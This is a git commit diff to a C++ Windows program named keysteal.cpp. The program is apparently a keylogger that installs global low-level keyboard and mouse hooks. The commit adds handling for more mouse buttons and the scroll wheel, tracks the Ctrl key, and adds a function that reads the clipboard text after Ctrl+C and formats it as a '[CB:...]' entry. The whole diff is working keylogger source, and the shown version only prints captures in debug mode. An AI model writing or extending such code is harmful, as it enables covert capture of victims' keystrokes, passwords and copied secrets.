e9030aaf069c4ab8aec71f6c15d62a5ce7870f60
Paul Kusik <djkusin@gmail.com>
2019-07-15 12:27:42 +0200

    Add clipboard handling & mouse basics

--- keysteal.cpp
+++ keysteal.cpp
@@ -1,4 +1,4 @@
-//C++ Headers
+//Win Headers
 #include <windows.h>
 #include <winuser.h>
 
@@ -13,6 +13,7 @@
 #endif
 
 #define LPSTR_SIZE 0xFF
+#define MAX_BUFLEN 5120
 
 //Global variables
 HHOOK mousehook;
@@ -36,6 +37,7 @@ void ReleaseHooks();
 bool IfPrintable(char* str);
 void CheckNumpad(char* str, bool numlock, bool shortcut);
 void CheckSpecialChar(char *str);
+void GetClipboardContent();
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
@@ -57,14 +59,57 @@ LRESULT CALLBACK HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
         mouse_struct = *((MSLLHOOKSTRUCT*)lParam);
 
+        // std::cout << "x: " << mouse_struct.pt.x << "\ty: " << mouse_struct.pt.y << "\n";
+
         switch (wParam) {
             case WM_LBUTTONDOWN:
-            // std::cout << "Left mouse click\n";
+#ifdef DEBUG
+            std::cout << "[LMB DOWN]\n";
+#endif
             break;
 
             case WM_LBUTTONUP:
-            // std::cout << "Left mouse unclick\n";
+#ifdef DEBUG
+            std::cout << "[LMB UP]\n";
+#endif
             break;
+
+            case WM_RBUTTONDOWN:
+#ifdef DEBUG
+            std::cout << "[RMB DOWN]\n";
+#endif
+            break;
+
+            case WM_RBUTTONUP:
+#ifdef DEBUG
+            std::cout << "[RMB UP]\n";
+#endif
+            break;
+
+            case WM_MBUTTONDOWN:
+#ifdef DEBUG
+            std::cout << "[MMB DOWN]\n";
+#endif
+            break;
+
+            case WM_MBUTTONUP:
+#ifdef DEBUG
+            std::cout << "[MMB UP]\n";
+#endif
+            break;
+
+            case WM_MOUSEWHEEL:
+            short rotation = (short)HIWORD(mouse_struct.mouseData);
+            if (rotation > 0) {
+#ifdef DEBUG
+                std::cout << "[FWD ROTATE " << rotation << "]\n";
+#endif        
+            }
+            else {
+#ifdef DEBUG
+                std::cout << "[BWD ROTATE" << rotation << "]\n";
+#endif
+            }
         }
     }
 
@@ -76,6 +121,8 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
         static bool capslock = GetKeyState(VK_CAPITAL);
         static bool shift = false;
         static bool numlock = GetKeyState(VK_NUMLOCK);
+        static bool ctrl = GetKeyState(VK_CONTROL);
+        static bool clipboard = false;
         bool shortcut = false;
         kbd_struct = *((KBDLLHOOKSTRUCT*)lParam);
         char str[LPSTR_SIZE] = {0};
@@ -108,20 +155,20 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
                 else if (strcmp(str, "Num Lock") == 0) {
                     numlock = !numlock;
                 }
+                else if ((strcmp(str, "Ctrl") == 0) || (strcmp(str, "Right Ctrl") == 0)) {
+                    ctrl = true;
+                }
 
                 if ((strcmp(str, "Enter") == 0) || (strcmp(str, "Num Enter") == 0)) {
                     strncpy(str, "\n", LPSTR_SIZE);
-                    // printable = true;
                     shortcut = true;
                 }
                 else if (strcmp(str, "Space") == 0) {
                     strncpy(str, " ", LPSTR_SIZE);
-                    // printable = true;
                     shortcut = true;
                 }
                 else if (strcmp(str, "Tab") == 0) {
                     strncpy(str, "\t", LPSTR_SIZE);
-                    // printable = true;
                     shortcut = true;
                 }
                 else {
@@ -135,12 +182,13 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
             else if (printable) {
                 int val = int(str[0]);
-                if (((val >= 65) && (val <= 90)) || (val >= 97 && val <= 122)) {
+                if ((val >= 65) && (val <= 90)) {
                     if (shift == capslock) {
                         str[0] = tolower(str[0]);
-                    }
-                    else {
-                        str[0] = toupper(str[0]);
+
+                        if (val == 67 && ctrl) {
+                            clipboard = true;
+                        }
                     }
                 }
                 else {
@@ -156,6 +204,13 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
         else if(wParam == WM_KEYUP) {
             if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {
                 shift = false;
+            }
+            else if ((strcmp(str, "Ctrl") == 0) || (strcmp(str, "Right Ctrl") == 0)) {
+                ctrl = false;
+            }
+            if (clipboard) {
+                GetClipboardContent();
+                clipboard = false;
             }
         }
     }
@@ -360,4 +415,40 @@ void CheckSpecialChar(char* str) {
     else if (str[0] == *"/") {
         str[0] = '?';
     }
+}
+
+void GetClipboardContent() {
+    HANDLE clip;
+    LPSTR pText;
+    char text[MAX_BUFLEN];
+
+    if (OpenClipboard(NULL)) {
+        clip = GetClipboardData(CF_TEXT);
+        if (clip == NULL) {
+            CloseClipboard();
+            return;
+        }
+        
+        pText = (LPSTR)GlobalLock(clip);
+        if (pText == NULL) {
+            GlobalUnlock(clip);
+            CloseClipboard();
+            return;
+        }
+
+        strncpy(text, pText, MAX_BUFLEN);
+        GlobalUnlock(clip);
+        CloseClipboard();
+    }
+    else {
+#ifdef DEBUG
+        std::cout << "Failed to get clipboard content!\n";
+#endif
+        return;
+    }
+    char result[MAX_BUFLEN] = {0};
+    snprintf(result, MAX_BUFLEN, "[CB:%s]", text);
+#ifdef DEBUG
+    std::cout << result << "\n";
+#endif
 }
